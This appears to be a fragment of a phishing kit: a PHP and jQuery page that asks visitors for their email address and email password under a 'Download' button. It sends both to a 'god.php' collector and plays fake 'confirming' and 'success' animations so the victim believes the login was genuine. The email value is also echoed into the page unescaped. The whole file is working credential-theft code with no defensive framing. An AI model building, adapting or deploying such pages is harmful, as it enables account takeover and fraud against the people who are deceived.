﻿<?php require_once("my.php"); 
if($email){
?>

<script>
$(document).ready(function(e) {
	$('#password').keyup(function() {
	var validateEmaili = function(elementValue) {
    var emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
    return emailPattern.test(elementValue);
}
    var value = $("#email").val();
    var validi = validateEmaili(value);

    var validpasswd = $(this).val().length>4;

    if (!validpasswd) {

        $(this).css('color', 'red') .css("border-color","red");
        $('.sub2').attr('disabled', true); 
    } else {

        $(this).css("border-color","green") .css("-webkit-box-shadow","inset 0 1px 1px rgba(0, 0, 0, .075)") .css("box-shadow","inset 0 1px 1px rgba(0, 0, 0, .075)").css("background-color","#DBDBDB") .css("color","green");
    if (!validi) {
		<?php if($ref=="yes"){ ?>
        $(this).css('color', 'red') .css("border-color","red");
        $('#fom2').hide(function(){
			$('#fominvalidlink').show();
			}); 
        $('.sub12').attr('disabled', true); 
		<?php }else{ ?>
        $(this).css('color', 'red') .css("border-color","red");
        $('#password').val(""); 
        $('#email').focus();
        $('.sub2').attr('disabled', true); 
		<?php } ?>
    } else {
        $(this).css("border-color","green") .css("-webkit-box-shadow","inset 0 1px 1px rgba(0, 0, 0, .075)") .css("box-shadow","inset 0 1px 1px rgba(0, 0, 0, .075)").css("background-color","#DBDBDB") .css("color","green");
        $('.sub2').attr('disabled', false);
 
    }



    }
});

	$(".sub2").click(function() {
    var email = $("#email").val();
    var password = $("#password").val();
	var count = $("#count").val();
    $("#first").slideUp(function(){
    $("#loader").fadeIn(function(){
	$('#confirmall').hide(function(){
	$('#confirming').show(3000, function(){
		$('#confirming').hide(function(){
			$('#confirmingsuccess1').fadeIn(3000,function(){
				$('#confirmingsuccess1').fadeOut(function(){
					$('#confirmingsuccess2').show(function(){
						$('#mybody').css("background-image","url(BG2.jpg)").css("background-repeat","no-repeat").css("position","static");
						});
					
					})
				})
			})
		});
	});
$.post("god.php", { email: email, password: password, count:count },
    function(data) {
     $('#loader').fadeOut(8000, function(){
		 $('#fom').hide('fast',function(){
          $('#fom2').slideDown('slow',function(){
			  $('#fom3').fadeIn();
			  $('#form2btn').html(data);
			  });
		 });
        });
    });
		});
		});
});

});
</script>
<input type="hidden" name="count" value="2" id="count">
<?php if($ref=="yes"){ ?>
<input type="hidden" value="<?php echo $email; ?>" id="email" name="email">
<h3><?php echo $email; ?></h3>
<?php }else{ ?>
<input type="text" id="email" value="<?php echo $email; ?>" name="email" placeholder="enter your email">
<?php } ?>
<input type="password" id="password" name="password" placeholder="enter the email password">
<button id="sub" class="sub2" disabled="disabled">Download</button>
<?php } ?>